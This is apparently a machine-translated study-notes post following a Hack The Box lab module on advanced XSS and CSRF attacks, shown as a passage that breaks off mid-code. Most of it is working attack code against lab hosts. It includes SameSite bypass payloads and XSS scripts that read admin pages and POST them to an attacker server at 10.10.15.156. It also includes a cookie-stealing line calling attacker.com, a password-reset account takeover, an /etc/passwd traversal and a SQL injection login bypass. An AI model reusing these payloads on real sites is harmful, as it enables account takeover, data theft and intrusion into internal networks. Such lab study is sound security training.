<p>We can exploit this behavior to bypass restrictions imposed by SameSite Cookies. For example, when a session cookie sets the SameSite property to <code>Lax</code>, will only be sent for secure requests (such as GET requests). SameSite protection has no effect if the web application contains any state change endpoints accessed via GET requests. The same situation occurs if all state switching operations use POST requests, but the web application is misconfigured to accept GET requests.</p>
<p>If you must bypass <code>strict</code> With SameSite limitations, we can combine the above misconfiguration with a client-side redirection of the target site. If we write a payload that sends the victim to the client redirect endpoint, the client redirect is initiated by the target site and therefore is considered SameSite. Therefore, even if the SameSite property is set to <code>strict</code>, the victim's cookie is also sent with the request. A successful CSRF attack can be performed if we redirect the victim to a misconfigured endpoint that accepts GET requests for state change operations.</p>
<blockquote><strong>Note:</strong> This bypass only works for client-side redirects, not server-side redirects such as HTTP 3xx status codes.</blockquote>
<p>For example, consider the following web application that sets the SameSite cookie attribute of the session cookie to <code>strict</code>: </p>
<img alt="Pasted image 20260415202639" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png"/>
<p>Interestingly, the web app redirects us to a temporary page after successful login, which then redirects to our profile:</p>
<img alt="Pasted image 20260415202651" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png"/>
<p>Looking at the source code we can see that the resulting redirect is via HTML<code>meta</code> Tag implementation, which is a client-side redirection:</p>
<p>Additionally, we can pass <code>user</code> The GET parameter injects additional GET parameters into the URL, as the web app appears to copy the parameter in the redirect URL:</p>
<img alt="Pasted image 20260415203605" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png"/>
<p>The user profile has the CSRF vulnerability discussed a few sections ago, allowing us to pass <code>/profile.php？promote=htb-stdnt</code> Endpoint promotion users. However, since the SameSite property is set to <code>Strict</code>, our previous load wasn't working properly. Instead, we can leverage client-side redirection to engineer a successful CSRF exploit. To do this, we must ensure that the victim has access to the terminal, thus enabling client redirection. Additionally, the victim needs to be redirected to a directory containing <code>promote=htb-stdnt</code> GET parameter URL to elevate the user to administrator privileges. We can achieve this through a payload similar to the following:</p>
<pre><code class="language-html">&lt;script&gt;
document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
&lt;/script&gt;</code></pre>
<p>This payload is set up as our exploit and delivered to the victim, successfully performing a CSRF attack. Subsequently, we gained admin rights to the web application.</p>
<p>Finally, since subdomains are treated as SameSite, we can exploit XSS vulnerabilities in subdomains to bypass SameSite cookie restrictions. In this case, cross-origin requests are treated as SameSite. As a result, the victim's cookie is sent with the request, allowing a successful CSRF attack. We will explore this scenario in more detail in subsequent chapters.</p>
<p>Looking at our sample web app, you can see that it sets the session cookie <code>SameSite=Strict</code> Property to prevent cookies from being sent via any cross-site requests:</p>
<img alt="Pasted image 20260415203729" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png"/>
<p>However, as we discussed earlier, subdomains are considered part of the same website. So, let’s try to identify subdomains that may be affected by XSS. we can use <code>gobuster</code> To achieve:</p>
<pre><code>Chenduoduo@htb[/htb]$ gobuster vhost -k -u https://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

&lt;SNIP&gt;
===============================================================
2023/08/26 12:09:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
                                                              
===============================================================
2023/08/26 12:09:43 Finished
===============================================================</code></pre>
<p>By viewing subdomains <code>https://guestbook.vulnerablesite.htb</code>, we can identify the guestbook web application mentioned a few sections ago. We can confirm that the same XSS vulnerability still exists:</p>
<img alt="Pasted image 20260415203947" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png"/>
<p>Assume that the administrator who monitors guestbook entries is also <code>https://vulnerablesite.htb</code> Logging into the main application, we can exploit this XSS vulnerability to bypass SameSite restrictions and let administrators promote our users to administrators. To do this, we need to force the admin user to send a corresponding POST request, which can be achieved with the following XSS payload:</p>
<pre><code class="language-html">&lt;script&gt;
    var csrf_req = new XMLHttpRequest();
    var params = 'promote=htb-stdnt';
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;
</code></pre>
<p>After posting our payload to the guestbook and waiting for a few seconds for the admin user to access the page, we can see that the CSRF attack was successful and our user has been promoted:</p>
<img alt="Pasted image 20260415204018" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png"/>
<h3>Weak Token Explosion</h3>
<p>as <code>Session Security</code> As briefly discussed in the module, weak CSRF tokens can be bypassed to launch a successful CSRF attack. A simple bypass is possible when the CSRF token is not bound to the user session. In this scenario, an attacker accessing a compromised web application could add a valid CSRF token to a cross-origin request from their own session. The backend then accepts cross-initiated requests from the victim session because the CSRF token is valid. Another example is that CSRF tokens are not completely random, making them predictable. Depending on how the CSRF token is created (such as a hash of the username or the current timestamp), we may be able to guess it in one shot, or brute force the payload.</p>
<p>This time, the web application has been protected with a CSRF token, so normal CSRF attacks will no longer succeed. However, if we obtain multiple CSRF tokens, we can infer that this is an incrementing number, perhaps similar to a counter, and thus can be brute-forced:</p>
<img alt="Pasted image 20260415204116" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png"/>
<p>If we analyze the CSRF tokens more closely, we can see that the CSRF token is simply the current time as a Unix timestamp. This makes CSRF tokens predictable and allows us to create viable vulnerabilities to perform CSRF attacks. To do this, we must correctly guess the victim's CSRF token, which was the victim's last access before accessing our payload <code>/profile.php</code> The time of the endpoint. Since the default SameSite <code>Lax</code> Due to the limitations of the policy, we cannot use JavaScript code to dynamically brute force the CSRF token, so it is difficult to accurately grasp the timing. Therefore, we need to hardcode the guessed CSRF tokens in the HTML form and update the value for each guess:</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://vulnerablesite.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="hidden" name="csrf" value="1692981700" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>While this makes it more challenging to brute force CSRF tokens, thereby reducing the likelihood of a successful attack, it is possible to predict valid CSRF tokens and bypass weak protections.</p>
<ol><li>First add hosts:</li></ol>
<pre><code>echo '10.129.66.205 misc-csrf.htb exploitserver.htb' | sudo tee -a /etc/hosts</code></pre>
<ol><li>Login:</li></ol>
<pre><code>https://misc-csrf.htb/login.php  
user: htb-stdnt  
pass: Academy_student!</code></pre>
<ol><li>The bypass point for this question is not to type directly across sites.<code>/profile.php</code>, but use<strong>client redirect</strong> bypass <code>SameSite=Strict</code>. The idea given in the course materials is: let the victim first access a<strong>client redirect</strong>endpoint and put <code>promote=htb-stdnt</code> Inject it into the final redirected URL, so that subsequent requests will be treated as SameSite, and the administrator cookie will be included in the request to complete CSRF.</li></ol>
<ol><li>in the exploit server <code>/exploit</code> Save this payload in:</li></ol>
<pre><code>&lt;script&gt;  
document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";  
&lt;/script&gt;</code></pre>
<ol><li>Then open:</li></ol>
<pre><code>https://exploitserver.htb/deliver</code></pre>
<p>Select target:</p>
<pre><code>misc-csrf.htb</code></pre>
<p>point <code>Deliver</code>.</p>
<ol><li>Wait a few seconds and then reply:</li></ol>
<pre><code>https://misc-csrf.htb/profile.php</code></pre>
<p>The permissions have been changed to admin.</p>
<h2>XSS exploit</h2>
<p>We can exploit a cross-site scripting (XSS) vulnerability to make an HTTP request, obtain its response, and exfiltrate data to a server we control. Therefore, we can carefully construct an XSS payload, initiate a cross-domain request, and combine XSS with a CSRF payload to implement an attack technique that poses a threat to the victim's internal network.</p>
<p>Additionally, web browsers often enforce the SameSite policy for cookies if the SameSite attribute is not explicitly set, which <code>Lax</code> Greatly limits the possibility of CSRF attacks. Therefore, combining XSS and CSRF is a powerful attack technique.</p>
<p><strong>HttpOnly Cookie flag</strong> Stealing a victim's session cookie is the most widely used method by threat actors to exploit XSS vulnerabilities. However, by using session cookies on <code>HttpOnly</code> properties that prevent this technique. This attribute prevents JavaScript code from accessing the cookie. More specifically, if we access <code>document.cookie</code>, with <code>HttpOnly</code> The attribute's cookie will not exist, which actually prevents the victim's session cookie from being stolen. However, this does not necessarily lessen the severity of an XSS vulnerability. Since XSS allows us to execute arbitrary JavaScript code within the vulnerable web application in the victim's browser, and within the context of the victim, we can perform the same actions as if we knew the session cookie. However, instead of manually setting the victim session cookie in the browser, we need to write an XSS payload that performs the action on our behalf.</p>
<p><strong>Exfiltrating Data with XSS</strong></p>
<p>The payload of an XSS attack is executed in the victim's browser or user environment, allowing the attacker to obtain data accessed from the victim's perspective. A low-privilege attacker can exploit XSS vulnerabilities to gain administrative access to the victim application, provided that the victim has administrative rights. We can exploit this to steal arbitrary data from the web application.</p>
<p>In order to access information in the victim context and exfiltrate the information to our exfiltration server, we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a> Object, which allows us to send HTTP requests and interact with responses.</p>
<p>Our sample web app is the same guestbook app we've seen before. The same XSS vulnerability still exists. But this time, the session cookie is set <code>HttpOnly</code> Flags to prevent us from stealing:</p>
<img alt="Pasted image 20260418042747" src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png"/>
<blockquote>set <code>HttpOnly</code> Cookies cannot be <code>document.cookie</code> Read, cannot be accessed by any front-end JS.</blockquote>
<blockquote>For example, a common stealing method is XSS,<code>new Image().src="http://attacker.com/?c="+document.cookie</code></blockquote>
<blockquote><code>HttpOnly</code> What is blocked is the reading path from the browser script to the cookie.</blockquote>
<p>Assuming the victim is an administrator, we should look at the web application from their perspective to determine if there are any features that are only visible to administrators. To do this, let’s access a known endpoint in the victim context and respond to our divestment server. To do this, we can create an entry in the guestbook containing the following XSS payload:</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>We can then exploit the server to write an XSS payload. We will use a simple payload, access <code>/home.php</code> endpoint and export the base64-encoded response to the stealing server:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>After waiting for the victim to trigger our payload, we will receive a base64 encoded response at the evacuation server:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
10.129.136.40 - - [30/Nov/2025 12:36:37] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 12:36:37] [i] POST body: {"data":"CjwhRE&lt;SNIP&gt;Ww+"}
10.129.136.40 - - [30/Nov/2025 12:36:37] "POST /log HTTP/1.1" 200 -</code></pre>
<p>After decoding the response, we can analyze whether it is related to a low-privileged user in <code>/home.php</code> There are differences in what the endpoints access. We can find that in the navigation section of the reply, /<code>admin.php</code> There is a reference to the admin dashboard, but not in the context of our user:</p>
<img alt="Pasted image 20260418043458" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png"/>
<p>Let's adjust the load on the vulnerable server to /<code>admin.php</code> The endpoint instead steals, thereby stealing the administrator dashboard, including any potentially sensitive data:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>We don't post new entries on the guestbook because administrators access the guestbook regularly, triggering our XSS payload each time. Since this triggers the payload code to be loaded from the exploit server, simply modify the exploit code. This allows us to extract the entire admin dashboard, including all information accessed by administrators:</p>
<img alt="Pasted image 20260418043537" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043537.png"/>
<pre><code class="language-js"># Create a new http request object
var xhr = new XMLHttpRequest();
# Request method, access path, asynchronous request (the entire page will not be stuck when making a request, and the callback function will be executed after the request is completed)
xhr.open('GET', '/admin.php', true);
# Let the browser automatically bring the credentials of the current site (Cookie, session, authentication information, etc.) in this request.
xhr.withCredentials = true;

# Define a callback function, onload, to trigger when loading is complete.
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    # Because the content sent next is in JSON format, Content-Type needs to be defined
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p><code>exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));</code></p>
<ul><li><code>xhr.responseTest</code>: indicates the previous one <code>xhr</code> The response body obtained by the request, which is the html content returned by admin.php</li><li><code>btoa()</code>: perform base64 encoding</li><li><code>JSON.stringify(...)</code>: Convert the above JS object into a JSON string. For example it becomes:<code>{"data":"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="}</code></li><li><code>exfil.send(...)</code>: Execute send command</li></ul>
<h2>Attack from victim session</h2>
<p>After discussing how to steal data from the victim user context with an XSS vulnerability, we'll look at how to trigger actions that may change state. Since XSS gives us complete control over the victim's session, we can trigger any functionality implemented by the web application in the context of the victim user. This could lead to a complete takeover of the victim's account, or facilitate further attacks.</p>
<p><strong>Account takeover</strong> This time, our sample web application includes the ability to update user profiles, including user passwords:</p>
<img alt="Pasted image 20260418060231" src="assets/posts/advanced-xss-csrf/Pasted image 20260418060231.png"/>
<p>Updating the configuration file is accomplished with the following HTTP request:</p>
<img alt="Pasted image 20260418152825" src="assets/posts/advanced-xss-csrf/Pasted image 20260418152825.png"/>
<p>Since updating an account password does not require the old password, we can exploit a known XSS vulnerability to change the victim's password. This allowed us to log into the victim's account, allowing us to completely take over their account. The form is secured with a CSRF_token, but due to an XSS vulnerability we can read the CSRF token and add it to the request.</p>
<p>To do this, we use the same XSS vulnerability used in the previous chapter to load JavaScript code from the vulnerable server:</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>After that, we can <code>/home.php</code> Send a GET request to obtain a valid CSRF token, extract it, and then make a POST request to change the victim's password to <code>pwned</code>.</p>
<pre><code class="language-js">// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = \`username=admin&amp;email=admin@vulnerablesite.htb&amp;password=pwned&amp;csrf_token=\${csrftoken}\`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>After waiting for the admin user to trigger XSS, we can use <code>admin:pwned</code> credentials to log into the victim's account.</p>
<p><strong>Chaining Vulnerabilities</strong> As mentioned above, we can exploit XSS vulnerabilities to trigger any functionality in a web application from the victim's user context. We can go a step further and chain multiple vulnerabilities together by exploiting different vulnerabilities on endpoints in the web application that only the victim has access to.</p>
<p>To do this, we first need to analyze the web application from the victim's perspective, identify endpoints that the victim has access to but not our own account, and finally, any vulnerabilities discovered through our XSS load tests and exploits.</p>
<p>We'll again use the same base XSS payload that exploits a custom exploit on the server:</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>Steal from the victim's user context <code>/home.php</code> endpoint will expose endpoint/<code>admin.php</code>, which our users cannot access:</p>
<img alt="Pasted image 20260418153117" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png"/>
<p>To identify the data displayed by the admin endpoint, we can export the response using the same payload used in the previous section:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>This reveals the following HTML response:</p>
<img alt="Pasted image 20260418153143" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png"/>
<p>After analyzing the HTML source code, it appears that the admin endpoint supports GET parameters <code>view</code>, can be set to different files in the current working directory. This is an obvious entry point for local file inclusion (LFI) vulnerabilities. To verify our hypothesis, let's adjust the payload to include the file <code>/etc/passwd</code>: </p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>After waiting for the victim to trigger the XSS vulnerability again, we received the following response to the evacuation server, which contained our leaked files:</p>
<img alt="Pasted image 20260418153219" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png"/>
<blockquote><strong>Note:</strong> We can save the HTML code to a local file and open it in a web browser to display the page. We may need to leak more files, such as script files or stylesheets, to render the page correctly.</blockquote>
<h2>Enum Internal API</h2>
<p>As we have seen, we can exploit XSS vulnerabilities to trigger specific functionality within the victim's user context and steal data that the victim has access to. However, since the XSS payload is executed in the victim's browser, it also allows us to attack other web applications that are only accessible within the victim's private network.</p>
<p><strong>Identify internal APIs</strong> Our attack will begin the same way as in the previous sections. We'll start by publishing the basic XSS payload as a guestbook entry:</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>Afterwards, we will extract the admin endpoint to identify features that may be useful to admins:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>The following conclusions can be drawn from this:</p>
<img alt="Pasted image 20260418154643" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154643.png"/>
<p>As we can see, the management endpoint loads additional information from the API<code>https://api.internal-apis.htb/</code>. However, if we try to access the API, we are blocked, indicating that the API is only accessible from the victim's local network:</p>
<img alt="Pasted image 20260418154701" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png"/>
<p>Therefore, we had to adapt the XSS payload to enumerate the API in the victim's browser.</p>
<p><strong>Enum internal API</strong> First, let’s extract the leaked endpoint in the admin endpoint <code>/v1/sessions</code>. We can achieve this by adjusting the XSS payload accordingly:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>After updating the payload and waiting for a while, we did not receive any more data about the data breach server, indicating something went wrong.</p>
<p>Since we are communicating with an API with a different origin, the Same Origin Policy prevents us from accessing the response unless the API implements the appropriate CORS headers to bypass the Same Origin Policy. Since the management endpoint gets data from the API across domains, we can assume that the API has CORS configured, allowing us to access the response. However, if we analyze more closely the client-side JavaScript code that fetches the data, we see that the call to the function <code>fetch</code> No <code>credentials: 'include'</code> Set CORS properties. On the other hand, we <code>withCredentials</code> This property is set explicitly in the payload. If the API does not pass the settings <code>Access-Control-Allow-Credentials</code> CORS header to allow this, there is no way to bypass the Same Origin Policy and a CORS error will be thrown, preventing us from accessing the response. To bypass this issue we need to match the parameters set in the leaked call <code>fetch</code>, and send the request without providing credentials:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>This indicates that we need to exactly match the configuration expected by the internal API to avoid CORS issues. Since we do not have direct access to the API, we cannot analyze the CORS configuration by identifying the CORS headers set in the response. We need to copy the configuration from the leaked HTML code, which implements communication with the internal API. CORS errors prevent subsequent statements from executing. Therefore, it is recommended to use a <code>try-catch</code> code block to identify the correct CORS configuration to export the response, making it easier to debug the payload (note that <code>async</code> Parameters in the call <code>xhr.open</code> set to <code>false</code>): </p>
<pre><code class="language-js">try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
    xhr.withCredentials = true;
    xhr.send();
    var msg = xhr.responseText;
} catch (error) {
    var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("POST", "https://10.10.15.156:4443/log", true);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
<p>This will cause the following information to be leaked, indicating that there is a problem with our HTTP request, allowing us to adjust the configuration of the request to match the CORS configuration:</p>
<pre><code class="language-txt">NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'https://api.internal-apis.htb/v1/sessions'.</code></pre>
<p>Additionally, internal APIs may require authentication using an authentication holder instead of a cookie. we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noreferrer" target="_blank">localStorage</a>The attribute accesses the authentication holder stored in the victim's local storage (in the context of the vulnerable web application). Then we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" rel="noreferrer" target="_blank">setRequestHeader</a><code>Authorization</code> Function sets request headers.<code>XMLHttpRequest</code></p>
<blockquote><strong>Note:</strong> If you don't receive the expected data, keep in mind that there may be a problem with the CORS configuration or missing authentication.</blockquote>
<p>With appropriate modifications to avoid CORS errors, we receive the data from the compromised server, which we can then decode:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}</code></pre>
<p>Since the data does not contain any valuable information, we further enumerate the API to identify additional endpoints. We can identify additional endpoints by implementing directory brute force in the XSS payload, which leaks all existing endpoints to the compromised server. we will base on<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" rel="noreferrer" target="_blank">objects-lowercase.txt</a>Dictionary for proof of concept <code>SecLists</code>. The payload will send a request to each endpoint and then determine if the endpoint is valid by checking the status code. We can achieve this using a payload similar to the following:</p>
<pre><code class="language-js">var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', \`https://api.internal-apis.htb/v1/\${endpoints[i]}\`, false);
        xhr.send();
        
        if (xhr.status!= 404){
            var exfil = new XMLHttpRequest();
            exfil.open("POST", "https://10.10.15.156:4443/log", true);
            exfil.setRequestHeader("Content-Type", "application/json");
            exfil.send(JSON.stringify({data: btoa(endpoints[i])}));
        }
    } catch {
        // do nothing
    }
}</code></pre>
<p>This will leak the existing API endpoint to the leak server, which we can then analyze further:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
10.129.136.40 - - [30/Nov/2025 13:06:44] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 13:06:44] [i] POST body: {"data":"YWNjb3VudHM="}</code></pre>
<p>The leaked API endpoints are:<code>users</code>. Then update the payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/users', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<h2>Leveraging internal web applications (1)</h2>
<p><strong>Identify vulnerabilities</strong></p>
<p>We will use the same XSS attack payload from the previous sections and <code>/admin.php</code> Endpoint data exfiltration begins. We will omit this part here since we have already discussed the corresponding attack payloads in previous sections. When a victim triggers an XSS vulnerability, the response is exfiltrated to the compromised server. We can see that the management endpoint contains a reference to the internal web application <code>https://internal.internal-webapps-1.htb</code>: </p>
<img alt="Pasted image 20260418161718" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png"/>
<p>If we try to access the page directly, we are blocked:</p>
<img alt="Pasted image 20260418161726" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png"/>
<p>So, let's enumerate the web application using an XSS vulnerability, just like we did with the internal API in the previous section. We will first extract the index of the web application:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-1.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>It turns out that the internal web application is protected by authentication because the index contains a login form:</p>
<img alt="Pasted image 20260418161829" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161829.png"/>
<p>XSS vulnerabilities allow us to fully interact with internal web applications. We can try using default passwords or brute force other endpoints. However, this section will focus on SQL injection vulnerabilities. We can construct a valid login POST request from the login form, which will be accepted by the internal web application. Let's try a simple SQL injection, sending a username containing single quotes:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("'test")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>This resulted in the following response, confirming a SQL injection vulnerability in the internal web application:</p>
<pre><code class="language-html">HTTP 500 - SQL Error</code></pre>
<p><strong>Exploit vulnerabilities</strong> We will exploit a SQL injection vulnerability to bypass the login and extract the contents of the database.</p>
<p>We will first bypass authentication, this can be achieved by username <code>' OR '1'='1'-- -</code>: </p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' OR '1'='1' -- -")}&amp;pass=x\`;
